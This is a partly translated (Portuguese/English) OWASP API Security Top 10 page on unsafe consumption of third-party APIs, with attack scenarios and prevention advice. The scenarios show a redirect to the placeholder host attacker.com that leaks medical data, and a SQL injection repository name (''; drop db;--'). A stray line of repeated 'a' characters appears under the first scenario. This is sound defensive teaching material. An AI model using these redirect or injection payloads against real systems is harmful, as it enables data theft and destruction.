# API10:2023 Unsafe Consumption of APIs

| Agentes Ameaça/Vetores Ataque | Falha Segurança | Impactos |
| - | - | - |
| Específico da API : Abuso **Fácil** | Prevalência **Comum** : Deteção **Moderado** | Técnico **Severo** : Específico Negócio |
| Explorar este problema requer que os atacantes identifiquem e potencialmente comprometam outras APIs/serviços com os quais a API alvo está integrada. Normalmente, esta informação não está disponível publicamente ou a API/serviço integrado não é facilmente explorável. | Os desenvolvedores tendem a confiar e não a verificar os _endpoints_ que interagem com APIs externas ou de terceiros, dependendo de requisitos de segurança mais fracos, como aqueles relacionados à segurança do transporte, autenticação/autorização e validação e sanitização de dados. Os atacantes precisam identificar os serviços com os quais a API alvo se integra (fontes de dados) e, eventualmente, comprometer esses serviços. | O impacto varia de acordo com o que a API alvo faz com os dados extraídos. A exploração bem sucedida pode levar à exposição de informações sensíveis a atores não autorizados, a vários tipos de injeções ou à negação de serviço. |

## A API é vulnerável?

Os desenvolvedores tendem a confiar mais nos dados recebidos de APIs de 
terceiros do que nos dados fornecidos por utilizadores. Isso é especialmente 
verdade para APIs oferecidas por empresas bem conhecidas. Por essa razão, os 
desenvolvedores tendem a adotar padrões de segurança mais fracos, especialmente 
no que diz respeito à validação e sanitização de dados.

A API pode estar vulnerável se:

* Interage com outras APIs através de um canal não encriptado;
* Não valida e sanitiza corretamente os dados recolhidos de outras APIs antes de
  os processar ou de os passar para componentes posteriores;
* Segue redirecionamentos cegamente;
* Não limita o número de recursos disponíveis para processar respostas de
  serviços de terceiros;
* Não implementa limites de tempo para interações com serviços de terceiros;

## Exemplos de Cenários de Ataque

### Cenário #1
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
An API relies on a third-party service to enrich user provided business
addresses. When an address is supplied to the API by the end user, it is sent
to the third-party service and the returned data is then stored on a local
SQL-enabled database.

Bad actors use the third-party service to store an SQLi payload associated with
a business created by them. Then they go after the vulnerable API providing
specific input that makes it pull their "malicious business" from the
third-party service. The SQLi payload ends up being executed by the database,
exfiltrating data to an attacker's controlled server.

### Cenário #2

An API integrates with a third-party service provider to safely store sensitive
user medical information. Data is sent over a secure connection using an HTTP
request like the one below:

```
POST /user/store_phr_record
{
  "genome": "ACTAGTAG__TTGADDAAIICCTT…"
}
```

Bad actors found a way to compromise the third-party API and it starts
responding with a `308 Permanent Redirect` to requests like the previous one.

```
HTTP/1.1 308 Permanent Redirect
Location: https://attacker.com/
```

Since the API blindly follows the third-party redirects, it will repeat the
exact same request including the user's sensitive data, but this time to the
attacker's server.

### Cenário #3

An attacker can prepare a git repository named `'; drop db;--`.

Now, when an integration from an attacked application is done with the
malicious repository, SQL injection payload is used on an application that
builds an SQL query believing the repository's name is safe input.

## Como Prevenir

* When evaluating service providers, assess their API security posture.
* Ensure all API interactions happen over a secure communication channel (TLS).
* Always validate and properly sanitize data received from integrated APIs
  before using it.
* Maintain an allowlist of well-known locations integrated APIs may redirect
  yours to: do not blindly follow redirects.


## Referências

### OWASP

* [Web Service Security Cheat Sheet][1]
* [Injection Flaws][2]
* [Input Validation Cheat Sheet][3]
* [Injection Prevention Cheat Sheet][4]
* [Transport Layer Protection Cheat Sheet][5]
* [Unvalidated Redirects and Forwards Cheat Sheet][6]

### Externas

* [CWE-20: Improper Input Validation][7]
* [CWE-200: Exposure of Sensitive Information to an Unauthorized Actor][8]
* [CWE-319: Cleartext Transmission of Sensitive Information][9]

[1]: https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html
[2]: https://www.owasp.org/index.php/Injection_Flaws
[3]: https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html
[4]: https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
[5]: https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html
[6]: https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html
[7]: https://cwe.mitre.org/data/definitions/20.html
[8]: https://cwe.mitre.org/data/definitions/200.html
[9]: https://cwe.mitre.org/data/definitions/319.html
